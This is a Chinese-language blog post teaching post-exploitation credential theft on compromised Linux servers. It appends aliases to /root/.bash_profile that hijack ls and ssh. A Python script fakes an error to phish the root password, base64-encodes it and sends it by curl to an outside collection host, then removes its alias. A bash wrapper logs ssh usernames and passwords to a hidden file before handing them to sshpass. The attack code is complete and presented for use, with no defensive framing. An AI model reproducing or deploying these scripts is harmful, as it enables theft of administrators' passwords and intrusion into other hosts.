---
title: 探索基于linux别名特性窃取密码
date: 2020-02-12 11:51:24
description: 极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。





---

当通过web途径获取到linux机器时，往往想获取到root明文密码进行横向扩展，但是拿到shadow又无法解密，此时可以通过设置别名进行窃取管理员密码。

# 劫持系统ls命令：

首先设置变量别名到环境变量下并赋值文件权限

```
echo "alias ls=/var/tmp/update.py">> /root/.bash_profile 
chmod u+x /var/tmp/update.py
```

此处务必注意,在修改目标的任何配置文件之前,先备份下,不然出问题就尴尬了

```
cp /root/.bash_profile /var/tmp/.bash_profile
```

update.py具体代码如下：

```
#! /usr/bin/env python2.7
# -*- coding:UTF-8 -*-

import getpass
import os
import base64

filex = "/var/tmp/.pwds"

def password():

    if os.path.exists(filex):
        os.system('ls')
    else:
        print(("An unknown error occured and confirm your password:"))
        pwd = getpass.getpass("Password:")
        if len(pwd) == 0:
            pwd = getpass.getpass("Password:")

        # with open(filex,'w+') as f:
        #     f.write(a)
        url = 'http://shv707.ceye.io/{}'.format(base64.b64encode(pwd))
        os.popen('curl {} 2>/dev/null'.format(url))
        os.popen("sed -i '$d' /root/.bash_profile")
        os.mkdir(filex)
        os.system('ls')

if __name__ == "__main__":
    password()
```

等待管理员连接服务器后并执行ls时，就会弹出报错，要求输入密码而后将输入进的内容进行base64编码，通过拼接回传到攻击者页面，执行正常的命令并将环境变量恢复原样。

![img](https://www.yunzhijia.com/microblog/filesvr/5e44bdec28011f685eb60942)

# 劫持系统ssh命令：

当管理员执行ssh user@rhost时，首先执行攻击者设置好的别名文件，负责将输入的内容进行回传或保存本地，由于ssh不能通过管道符进行传参，则使用sshpass传参给正常的ssh连接。

```
echo "alias ssh=/var/tmp/ssh">> /root/.bash_profile 
chmod u+x /var/tmp/ssh
```

shell脚本具体代码如下：

```
#!/bin/bash

if [ $# != "1" ] 
then 
	/usr/bin/ssh 
else 
	echo -e "${1}'s password: \c" 
	read -s pass 
	echo $1":"$pass >> /var/tmp/.log 
	echo "" 
	sshpass -p "$pass" /usr/bin/ssh ${1}
fi
```

sshpass是用于非交互的ssh 密码验证

从命令行方式传递密码：

```
sshpass -p user_password ssh user_name@rhost
```

下载地址：

```
http://sourceforge.net/projects/sshpass/files/latest/download
```



下载后，解压，安装

```
tar -zxvf sshpass-1.06.tar.gz
./configure
make install
```



![img](https://www.yunzhijia.com/microblog/filesvr/5e44be5432f2ca5a1c6f190b)

最后，到指定的目录下，即可看到窃取到的远程服务器账号以及密码，如下：

![img](https://www.yunzhijia.com/microblog/filesvr/5e44c01790144e59595037cb)